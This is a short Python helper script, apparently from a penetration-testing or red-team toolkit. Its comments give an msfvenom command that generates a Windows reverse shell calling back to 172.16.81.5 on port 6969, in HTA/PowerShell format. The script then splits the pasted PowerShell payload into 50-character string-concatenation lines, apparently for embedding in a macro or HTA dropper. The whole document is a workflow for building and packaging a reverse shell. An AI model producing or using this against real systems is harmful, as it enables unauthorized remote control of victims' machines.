# 1. Use msfvenom to create reverse shell in hta format
# msfvenom -p windows/shell_reverse_tcp lhost=172.16.81.5 lport=6969 -f hta-psh
# 
# 2. Grab the powershell portion of the output
# 
# 3. Replace the value of ps_script
#
# 4. python ps_splitter.py, and get output of the splitted payload

ps_script = "<REPLACE ME WITH POWERSHELL PAYLOAD>"

n = 50

for i in range(0, len(ps_script), n):
        print('Str = Str + "{}"'.format(ps_script[i:i+n]))
